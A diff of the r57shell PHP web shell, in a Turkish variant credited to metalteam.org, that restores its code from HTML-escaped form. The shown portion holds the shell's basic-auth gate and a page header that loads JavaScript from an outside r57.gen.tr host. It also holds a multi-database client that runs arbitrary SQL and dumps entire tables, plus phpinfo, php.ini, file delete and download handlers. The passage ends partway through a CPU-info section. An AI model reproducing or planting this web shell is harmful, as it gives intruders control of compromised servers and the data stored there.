@@ -172,11 +172,11 @@ if(version_compare(phpversion(), '4.1.0') == -1)
  }
 if (@get_magic_quotes_gpc())
  {
- foreach ($_POST as $k=&gt;$v)
+ foreach ($_POST as $k=>$v)
   {
   $_POST[$k] = stripslashes($v);
   }
- foreach ($_SERVER as $k=&gt;$v)
+ foreach ($_SERVER as $k=>$v)
   {
   $_SERVER[$k] = stripslashes($v);
   }
@@ -187,16 +187,16 @@ if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name 
    {
    header('WWW-Authenticate: Basic realm="r57shell"');
    header('HTTP/1.0 401 Unauthorized');
-   exit("&lt;b&gt;&lt;a href=http://www.metalteam.org&gt;metalteam.orgs&lt;/a&gt; : Izin Verilmedi&lt;/b&gt;");
+   exit("<b><a href=http://www.metalteam.org>metalteam.orgs</a> : Izin Verilmedi</b>");
    }
 }
-$head = '&lt;!-- ??????????  ???? --&gt;
-&lt;html&gt;
-&lt;head&gt;
-&lt;SCRIPT SRC=http://www.r57.gen.tr/yazciz/ciz.js&gt;&lt;/SCRIPT&gt;
-&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1251"&gt;
+$head = '<!-- ??????????  ???? -->
+<html>
+<head>
+<SCRIPT SRC=http://www.r57.gen.tr/yazciz/ciz.js></SCRIPT>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
 
-&lt;STYLE&gt;
+<STYLE>
 tr {
 BORDER-RIGHT:  #aaaaaa 1px solid;
 BORDER-TOP:    #E8481C 1px solid;
@@ -278,7 +278,7 @@ A:link {COLOR:orange; TEXT-DECORATION: none}
 A:visited { COLOR:orange; TEXT-DECORATION: none}
 A:active {COLOR:orange; TEXT-DECORATION: none}
 A:hover {color:#BF0F0F;TEXT-DECORATION: none}
-&lt;/STYLE&gt;';
+</STYLE>';
 class zipfile
 {
     var $datasec      = array();
@@ -287,7 +287,7 @@ class zipfile
     var $old_offset   = 0;
     function unix2DosTime($unixtime = 0) {
         $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
-        if ($timearray['year'] &lt; 1980) {
+        if ($timearray['year'] < 1980) {
             $timearray['year']    = 1980;
             $timearray['mon']     = 1;
             $timearray['mday']    = 1;
@@ -295,13 +295,13 @@ class zipfile
             $timearray['minutes'] = 0;
             $timearray['seconds'] = 0;
         }
-        return (($timearray['year'] - 1980) &lt;&lt; 25) | ($timearray['mon'] &lt;&lt; 21) | ($timearray['mday'] &lt;&lt; 16) |
-                ($timearray['hours'] &lt;&lt; 11) | ($timearray['minutes'] &lt;&lt; 5) | ($timearray['seconds'] &gt;&gt; 1);
+        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
+                ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
     }
     function addFile($data, $name, $time = 0)
     {
         $name     = str_replace('\\', '/', $name);
-        $dtime    = dechex($this-&gt;unix2DosTime($time));
+        $dtime    = dechex($this->unix2DosTime($time));
         $hexdtime = '\x' . $dtime[6] . $dtime[7]
                   . '\x' . $dtime[4] . $dtime[5]
                   . '\x' . $dtime[2] . $dtime[3]
@@ -324,7 +324,7 @@ class zipfile
         $fr      .= pack('v', 0);
         $fr      .= $name;
         $fr .= $zdata;
-        $this -&gt; datasec[] = $fr;
+        $this -> datasec[] = $fr;
         $cdrec = "\x50\x4b\x01\x02";
         $cdrec .= "\x00\x00";
         $cdrec .= "\x14\x00";
@@ -340,21 +340,21 @@ class zipfile
         $cdrec .= pack('v', 0 );
         $cdrec .= pack('v', 0 );
         $cdrec .= pack('V', 32 );
-        $cdrec .= pack('V', $this -&gt; old_offset );
-        $this -&gt; old_offset += strlen($fr);
+        $cdrec .= pack('V', $this -> old_offset );
+        $this -> old_offset += strlen($fr);
         $cdrec .= $name;
-        $this -&gt; ctrl_dir[] = $cdrec;
+        $this -> ctrl_dir[] = $cdrec;
     }
     function file()
     {
-        $data    = implode('', $this -&gt; datasec);
-        $ctrldir = implode('', $this -&gt; ctrl_dir);
+        $data    = implode('', $this -> datasec);
+        $ctrldir = implode('', $this -> ctrl_dir);
         return
             $data .
             $ctrldir .
-            $this -&gt; eof_ctrl_dir .
-            pack('v', sizeof($this -&gt; ctrl_dir)) .
-            pack('v', sizeof($this -&gt; ctrl_dir)) .
+            $this -> eof_ctrl_dir .
+            pack('v', sizeof($this -> ctrl_dir)) .
+            pack('v', sizeof($this -> ctrl_dir)) .
             pack('V', strlen($ctrldir)) .
             pack('V', strlen($data)) .
             "\x00\x00";
@@ -382,8 +382,8 @@ function compress(&$filename,&$filedump,$compress)
      	$filename .= '.zip';
         $mime_type = 'application/zip';
         $zipfile = new zipfile();
-        $zipfile -&gt; addFile($filedump, substr($filename, 0, -4));
-        $filedump = $zipfile -&gt; file();
+        $zipfile -> addFile($filedump, substr($filename, 0, -4));
+        $filedump = $zipfile -> file();
      }
      else
      {
@@ -420,31 +420,31 @@ class my_sql
 
  function connect()
   {
-  	switch($this-&gt;db)
+  	switch($this->db)
      {
   	 case 'MySQL':
-  	  if(empty($this-&gt;port)) { $this-&gt;port = '3306'; }
+  	  if(empty($this->port)) { $this->port = '3306'; }
   	  if(!function_exists('mysql_connect')) return 0;
-  	  $this-&gt;connection = @mysql_connect($this-&gt;host.':'.$this-&gt;port,$this-&gt;user,$this-&gt;pass);
-  	  if(is_resource($this-&gt;connection)) return 1;
+  	  $this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass);
+  	  if(is_resource($this->connection)) return 1;
   	 break;
      case 'MSSQL':
-      if(empty($this-&gt;port)) { $this-&gt;port = '1433'; }
+      if(empty($this->port)) { $this->port = '1433'; }
   	  if(!function_exists('mssql_connect')) return 0;
-  	  $this-&gt;connection = @mssql_connect($this-&gt;host.','.$this-&gt;port,$this-&gt;user,$this-&gt;pass);
-      if($this-&gt;connection) return 1;
+  	  $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass);
+      if($this->connection) return 1;
      break;
      case 'PostgreSQL':
-      if(empty($this-&gt;port)) { $this-&gt;port = '5432'; }
-      $str = "host='".$this-&gt;host."' port='".$this-&gt;port."' user='".$this-&gt;user."' password='".$this-&gt;pass."' dbname='".$this-&gt;base."'";
+      if(empty($this->port)) { $this->port = '5432'; }
+      $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'";
       if(!function_exists('pg_connect')) return 0;
-      $this-&gt;connection = @pg_connect($str);
-      if(is_resource($this-&gt;connection)) return 1;
+      $this->connection = @pg_connect($str);
+      if(is_resource($this->connection)) return 1;
      break;
      case 'Oracle':
       if(!function_exists('ocilogon')) return 0;
-      $this-&gt;connection = @ocilogon($this-&gt;user, $this-&gt;pass, $this-&gt;base);
-      if(is_resource($this-&gt;connection)) return 1;
+      $this->connection = @ocilogon($this->user, $this->pass, $this->base);
+      if(is_resource($this->connection)) return 1;
      break;
      }
     return 0;
@@ -452,13 +452,13 @@ class my_sql
 
  function select_db()
   {
-   switch($this-&gt;db)
+   switch($this->db)
     {
   	case 'MySQL':
-  	 if(@mysql_select_db($this-&gt;base,$this-&gt;connection)) return 1;
+  	 if(@mysql_select_db($this->base,$this->connection)) return 1;
     break;
     case 'MSSQL':
-  	 if(@mssql_select_db($this-&gt;base,$this-&gt;connection)) return 1;
+  	 if(@mssql_select_db($this->base,$this->connection)) return 1;
     break;
     case 'PostgreSQL':
      return 1;
@@ -472,50 +472,50 @@ class my_sql
 
  function query($query)
   {
-   $this-&gt;res=$this-&gt;error='';
-   switch($this-&gt;db)
+   $this->res=$this->error='';
+   switch($this->db)
     {
   	case 'MySQL':
-     if(false===($this-&gt;res=@mysql_query('/*'.chr(0).'*/'.$query,$this-&gt;connection)))
+     if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection)))
       {
-      $this-&gt;error = @mysql_error($this-&gt;connection);
+      $this->error = @mysql_error($this->connection);
       return 0;
       }
-     else if(is_resource($this-&gt;res)) { return 1; }
+     else if(is_resource($this->res)) { return 1; }
      return 2;
   	break;
     case 'MSSQL':
-     if(false===($this-&gt;res=@mssql_query($query,$this-&gt;connection)))
+     if(false===($this->res=@mssql_query($query,$this->connection)))
       {
-      $this-&gt;error = 'Query error';
+      $this->error = 'Query error';
       return 0;
       }
-      else if(@mssql_num_rows($this-&gt;res) &gt; 0) { return 1; }
+      else if(@mssql_num_rows($this->res) > 0) { return 1; }
      return 2;
     break;
     case 'PostgreSQL':
-     if(false===($this-&gt;res=@pg_query($this-&gt;connection,$query)))
+     if(false===($this->res=@pg_query($this->connection,$query)))
       {
-      $this-&gt;error = @pg_last_error($this-&gt;connection);
+      $this->error = @pg_last_error($this->connection);
       return 0;
       }
-      else if(@pg_num_rows($this-&gt;res) &gt; 0) { return 1; }
+      else if(@pg_num_rows($this->res) > 0) { return 1; }
      return 2;
     break;
     case 'Oracle':
-     if(false===($this-&gt;res=@ociparse($this-&gt;connection,$query)))
+     if(false===($this->res=@ociparse($this->connection,$query)))
       {
-      $this-&gt;error = 'Query parse error';
+      $this->error = 'Query parse error';
       }
      else
       {
-      if(@ociexecute($this-&gt;res))
+      if(@ociexecute($this->res))
        {
-       if(@ocirowcount($this-&gt;res) != 0) return 2;
+       if(@ocirowcount($this->res) != 0) return 2;
        return 1;
        }
       $error = @ocierror();
-      $this-&gt;error=$error['message'];
+      $this->error=$error['message'];
       }
     break;
     }
@@ -523,37 +523,37 @@ class my_sql
   }
  function get_result()
   {
-   $this-&gt;rows=array();
-   $this-&gt;columns=array();
-   $this-&gt;num_rows=$this-&gt;num_fields=0;
-   switch($this-&gt;db)
+   $this->rows=array();
+   $this->columns=array();
+   $this->num_rows=$this->num_fields=0;
+   switch($this->db)
     {
   	case 'MySQL':
-  	 $this-&gt;num_rows=@mysql_num_rows($this-&gt;res);
-  	 $this-&gt;num_fields=@mysql_num_fields($this-&gt;res);
-  	 while(false !== ($this-&gt;rows[] = @mysql_fetch_assoc($this-&gt;res)));
-  	 @mysql_free_result($this-&gt;res);
-  	 if($this-&gt;num_rows){$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
+  	 $this->num_rows=@mysql_num_rows($this->res);
+  	 $this->num_fields=@mysql_num_fields($this->res);
+  	 while(false !== ($this->rows[] = @mysql_fetch_assoc($this->res)));
+  	 @mysql_free_result($this->res);
+  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
     break;
     case 'MSSQL':
-  	 $this-&gt;num_rows=@mssql_num_rows($this-&gt;res);
-  	 $this-&gt;num_fields=@mssql_num_fields($this-&gt;res);
-  	 while(false !== ($this-&gt;rows[] = @mssql_fetch_assoc($this-&gt;res)));
-  	 @mssql_free_result($this-&gt;res);
-  	 if($this-&gt;num_rows){$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;};
+  	 $this->num_rows=@mssql_num_rows($this->res);
+  	 $this->num_fields=@mssql_num_fields($this->res);
+  	 while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res)));
+  	 @mssql_free_result($this->res);
+  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;};
     break;
     case 'PostgreSQL':
-  	 $this-&gt;num_rows=@pg_num_rows($this-&gt;res);
-  	 $this-&gt;num_fields=@pg_num_fields($this-&gt;res);
-  	 while(false !== ($this-&gt;rows[] = @pg_fetch_assoc($this-&gt;res)));
-  	 @pg_free_result($this-&gt;res);
-  	 if($this-&gt;num_rows){$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
+  	 $this->num_rows=@pg_num_rows($this->res);
+  	 $this->num_fields=@pg_num_fields($this->res);
+  	 while(false !== ($this->rows[] = @pg_fetch_assoc($this->res)));
+  	 @pg_free_result($this->res);
+  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
     break;
     case 'Oracle':
-     $this-&gt;num_fields=@ocinumcols($this-&gt;res);
-     while(false !== ($this-&gt;rows[] = @oci_fetch_assoc($this-&gt;res))) $this-&gt;num_rows++;
-     @ocifreestatement($this-&gt;res);
-     if($this-&gt;num_rows){$this-&gt;columns = @array_keys($this-&gt;rows[0]); return 1;}
+     $this->num_fields=@ocinumcols($this->res);
+     while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++;
+     @ocifreestatement($this->res);
+     if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
     break;
     }
    return 0;
@@ -561,63 +561,63 @@ class my_sql
  function dump($table)
   {
    if(empty($table)) return 0;
-   $this-&gt;dump=array();
-   $this-&gt;dump[0] = '
+   $this->dump=array();
+   $this->dump[0] = '
 ###';
-   $this-&gt;dump[1] = '
+   $this->dump[1] = '
 ### --------------------------------------- ';
-   $this-&gt;dump[2] = '
+   $this->dump[2] = '
 ###  Created: '.date ("d/m/Y H:i:s");
-   $this-&gt;dump[3] = '
-### Database: '.$this-&gt;base;
-   $this-&gt;dump[4] = '
+   $this->dump[3] = '
+### Database: '.$this->base;
+   $this->dump[4] = '
 ###    Table: '.$table;
-   $this-&gt;dump[5] = '
+   $this->dump[5] = '
 ### --------------------------------------- ';
-   switch($this-&gt;db)
+   switch($this->db)
     {
   	case 'MySQL':
-  	 $this-&gt;dump[0] = '
+  	 $this->dump[0] = '
 ### MySQL dump';
-  	 if($this-&gt;query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;
-  	 if(!$this-&gt;get_result()) return 0;
-  	 $this-&gt;dump[] = $this-&gt;rows[0]['Create Table'];
-     $this-&gt;dump[] = '
+  	 if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;
+  	 if(!$this->get_result()) return 0;
+  	 $this->dump[] = $this->rows[0]['Create Table'];
+     $this->dump[] = '
 ### --------------------------------------- ';
-  	 if($this-&gt;query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;
-  	 if(!$this-&gt;get_result()) return 0;
-  	 for($i=0;$i&lt;$this-&gt;num_rows;$i++)
+  	 if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;
+  	 if(!$this->get_result()) return 0;
+  	 for($i=0;$i<$this->num_rows;$i++)
   	  {
-      foreach($this-&gt;rows[$i] as $k=&gt;$v) {$this-&gt;rows[$i][$k] = @mysql_real_escape_string($v);}
-  	  $this-&gt;dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this-&gt;columns).'`) VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');';
+      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @mysql_real_escape_string($v);}
+  	  $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
   	  }
     break;
     case 'MSSQL':
-     $this-&gt;dump[0] = '
+     $this->dump[0] = '
 ### MSSQL dump';
-     if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0;
-  	 if(!$this-&gt;get_result()) return 0;
-  	 for($i=0;$i&lt;$this-&gt;num_rows;$i++)
+     if($this->query('SELECT * FROM '.$table)!=1) return 0;
+  	 if(!$this->get_result()) return 0;
+  	 for($i=0;$i<$this->num_rows;$i++)
   	  {
-      foreach($this-&gt;rows[$i] as $k=&gt;$v) {$this-&gt;rows[$i][$k] = @addslashes($v);}
-  	  $this-&gt;dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this-&gt;columns).') VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');';
+      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
+  	  $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
   	  }
     break;
     case 'PostgreSQL':
-     $this-&gt;dump[0] = '
+     $this->dump[0] = '
 ### PostgreSQL dump';
-     if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0;
-  	 if(!$this-&gt;get_result()) return 0;
-  	 for($i=0;$i&lt;$this-&gt;num_rows;$i++)
+     if($this->query('SELECT * FROM '.$table)!=1) return 0;
+  	 if(!$this->get_result()) return 0;
+  	 for($i=0;$i<$this->num_rows;$i++)
   	  {
-      foreach($this-&gt;rows[$i] as $k=&gt;$v) {$this-&gt;rows[$i][$k] = @addslashes($v);}
-  	  $this-&gt;dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this-&gt;columns).') VALUES (\''.@implode("', '", $this-&gt;rows[$i]).'\');';
+      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
+  	  $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
   	  }
     break;
     case 'Oracle':
-      $this-&gt;dump[0] = '
+      $this->dump[0] = '
 ### ORACLE dump';
-      $this-&gt;dump[]  = '
+      $this->dump[]  = '
 ### under construction';
     break;
     default:
@@ -628,37 +628,37 @@ class my_sql
   }
  function close()
   {
-   switch($this-&gt;db)
+   switch($this->db)
     {
   	case 'MySQL':
-  	 @mysql_close($this-&gt;connection);
+  	 @mysql_close($this->connection);
     break;
     case 'MSSQL':
-     @mssql_close($this-&gt;connection);
+     @mssql_close($this->connection);
     break;
     case 'PostgreSQL':
-     @pg_close($this-&gt;connection);
+     @pg_close($this->connection);
     break;
     case 'Oracle':
-     @oci_close($this-&gt;connection);
+     @oci_close($this->connection);
     break;
     }
   }
  function affected_rows()
   {
-   switch($this-&gt;db)
+   switch($this->db)
     {
   	case 'MySQL':
-  	 return @mysql_affected_rows($this-&gt;res);
+  	 return @mysql_affected_rows($this->res);
     break;
     case 'MSSQL':
-     return @mssql_affected_rows($this-&gt;res);
+     return @mssql_affected_rows($this->res);
     break;
     case 'PostgreSQL':
-     return @pg_affected_rows($this-&gt;res);
+     return @pg_affected_rows($this->res);
     break;
     case 'Oracle':
-     return @ocirowcount($this-&gt;res);
+     return @ocirowcount($this->res);
     break;
     default:
      return 0;
@@ -694,61 +694,61 @@ if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="download_fil
     exit();
    }
  }
-if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;Geri&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; die(); }
+if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">Geri</a> ]</b></font></div>"; die(); }
 if ($_POST['cmd']=="db_query")
  {
  echo $head;
  $sql = new my_sql();
- $sql-&gt;db   = $_POST['db'];
- $sql-&gt;host = $_POST['db_server'];
- $sql-&gt;port = $_POST['db_port'];
- $sql-&gt;user = $_POST['mysql_l'];
- $sql-&gt;pass = $_POST['mysql_p'];
- $sql-&gt;base = $_POST['mysql_db'];
+ $sql->db   = $_POST['db'];
+ $sql->host = $_POST['db_server'];
+ $sql->port = $_POST['db_port'];
+ $sql->user = $_POST['mysql_l'];
+ $sql->pass = $_POST['mysql_p'];
+ $sql->base = $_POST['mysql_db'];
  $querys = @explode(';',$_POST['db_query']);
 
- if(!$sql-&gt;connect()) echo "&lt;div align=center&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;b&gt;Sql Server ile Baglant? Kurulamad? &lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
+ if(!$sql->connect()) echo "<div align=center><font face=Verdana size=-2 color=orange><b>Sql Server ile Baglant? Kurulamad? </b></font></div>";
   else
    {
-   if(!empty($sql-&gt;base)&&!$sql-&gt;select_db()) echo "&lt;div align=center&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;b&gt;DataBase Girilmedi&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
+   if(!empty($sql->base)&&!$sql->select_db()) echo "<div align=center><font face=Verdana size=-2 color=orange><b>DataBase Girilmedi</b></font></div>";
    else
     {
-    foreach($querys as $num=&gt;$query)
+    foreach($querys as $num=>$query)
      {
-      if(strlen($query)&gt;5)
+      if(strlen($query)>5)
       {
-      echo "&lt;font face=Verdana size=-2 color=white&gt;&lt;b&gt;Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."&lt;/b&gt;&lt;/font&gt;&lt;br&gt;";
-      switch($sql-&gt;query($query))
+      echo "<font face=Verdana size=-2 color=white><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>";
+      switch($sql->query($query))
        {
        case '0':
-       echo "&lt;table width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;Error : &lt;b&gt;".$sql-&gt;error."&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+       echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>";
        break;
        case '1':
-       if($sql-&gt;get_result())
+       if($sql->get_result())
         {
-       	echo "&lt;table width=100%&gt;";
-        foreach($sql-&gt;columns as $k=&gt;$v) $sql-&gt;columns[$k] = htmlspecialchars($v,ENT_QUOTES);
-       	$keys = @implode("&nbsp;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;&nbsp;", $sql-&gt;columns);
-        echo "&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;&nbsp;".$keys."&nbsp;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;";
-        for($i=0;$i&lt;$sql-&gt;num_rows;$i++)
+       	echo "<table width=100%>";
+        foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES);
+       	$keys = @implode("&nbsp;</b></font></td><td bgcolor=#396D95><font face=Verdana size=-2><b>&nbsp;", $sql->columns);
+        echo "<tr><td bgcolor=#396D95><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
+        for($i=0;$i<$sql->num_rows;$i++)
          {
-         foreach($sql-&gt;rows[$i] as $k=&gt;$v) $sql-&gt;rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES);
-         $values = @implode("&nbsp;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&nbsp;",$sql-&gt;rows[$i]);
-         echo '&lt;tr&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&nbsp;'.$values.'&nbsp;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
+         foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES);
+         $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$sql->rows[$i]);
+         echo '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>';
          }
-        echo "&lt;/table&gt;";
+        echo "</table>";
         }
        break;
        case '2':
-       $ar = $sql-&gt;affected_rows()?($sql-&gt;affected_rows()):('0');
-       echo "&lt;table width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;affected rows : &lt;b&gt;".$ar."&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;";
+       $ar = $sql->affected_rows()?($sql->affected_rows()):('0');
+       echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>";
        break;
        }
       }
      }
     }
    }
- echo "&lt;br&gt;&lt;form name=form method=POST&gt;";
+ echo "<br><form name=form method=POST>";
  echo in('hidden','db',0,$_POST['db']);
  echo in('hidden','db_server',0,$_POST['db_server']);
  echo in('hidden','db_port',0,$_POST['db_port']);
@@ -756,9 +756,9 @@ if ($_POST['cmd']=="db_query")
  echo in('hidden','mysql_p',0,$_POST['mysql_p']);
  echo in('hidden','mysql_db',0,$_POST['mysql_db']);
  echo in('hidden','cmd',0,'db_query');
- echo "&lt;div align=center&gt;&lt;textarea cols=65 rows=10 name=db_query&gt;".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."&lt;/textarea&gt;&lt;br&gt;&lt;input type=submit name=submit value=\" Run SQL query \"&gt;&lt;/div&gt;&lt;br&gt;&lt;br&gt;";
- echo "&lt;/form&gt;";
- echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;"; die();
+ echo "<div align=center><textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>";
+ echo "</form>";
+ echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
  }
 if(isset($_GET['delete']))
  {
@@ -779,7 +779,7 @@ if(isset($_GET['phpini']))
 echo $head;
 function U_value($value)
  {
- if ($value == '') return '&lt;i&gt;no value&lt;/i&gt;';
+ if ($value == '') return '<i>no value</i>';
  if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
  if ($value === null) return 'NULL';
  if (@is_object($value)) $value = (array) $value;
@@ -794,323 +794,323 @@ function U_value($value)
  }
 function U_wordwrap($str)
  {
- $str = @wordwrap(@htmlspecialchars($str), 100, '&lt;wbr /&gt;', true);
- return @preg_replace('!(&[^;]*)&lt;wbr /&gt;([^;]*;)!', '$1$2&lt;wbr /&gt;', $str);
+ $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
+ return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
  }
 if (@function_exists('ini_get_all'))
  {
  $r = '';
- echo '&lt;table width=100%&gt;', '&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;div align=center&gt;&lt;b&gt;Directive&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;div align=center&gt;&lt;b&gt;Local Value&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#396D95&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;div align=center&gt;&lt;b&gt;Master Value&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
- foreach (@ini_get_all() as $key=&gt;$value)
+ echo '<table width=100%>', '<tr><td bgcolor=#396D95><font face=Verdana size=-2 color=orange><div align=center><b>Directive</b></div></font></td><td bgcolor=#396D95><font face=Verdana size=-2 color=orange><div align=center><b>Local Value</b></div></font></td><td bgcolor=#396D95><font face=Verdana size=-2 color=orange><div align=center><b>Master Value</b></div></font></td></tr>';
+ foreach (@ini_get_all() as $key=>$value)
   {
-  $r .= '&lt;tr&gt;&lt;td&gt;'.ws(3).'&lt;font face=Verdana size=-2&gt;&lt;b&gt;'.$key.'&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;'.U_value($value['local_value']).'&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;font face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;'.U_value($value['global_value']).'&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;';
+  $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['local_value']).'</b></div></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['global_value']).'</b></div></font></td></tr>';
   }
  echo $r;
- echo '&lt;/table&gt;';
+ echo '</table>';
  }
-echo "&lt;br&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2&gt;&lt;b&gt;[ &lt;a href=".$_SERVER['PHP_SELF']."&gt;BACK&lt;/a&gt; ]&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;";
+echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
 die();
 }
 if(isset($_GET['cpu']))
  {
    echo $head;
-   echo '&lt;table width=100%&gt;&lt;tr&gt;&lt;td bgcolor=#396D95&gt;&lt;div align=center&gt;&lt;font face=Verdana size=-2 color=orange&gt;&lt;b&gt;CPU&lt;/b&gt;&lt;/font&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width=100%&gt;';
+   echo '<table width=100%><tr><td bgcolor=#396D95><div align=center><font face=Verdana size=-2 color=orange><b>CPU</b></font></div></td></tr></table><table width=100%>';
    $cpuf = @file("cpuinfo");
    if($cpuf)
     {
       $c = @sizeof($cpuf);
-      for($i=0;$i&lt;$c;$i++)
+      for($i=0;$i<$c;$i++)
         {
           $info = @explode(":",$cpuf[$i]);
           if($info[1]==""){ $info[1]="---"; }
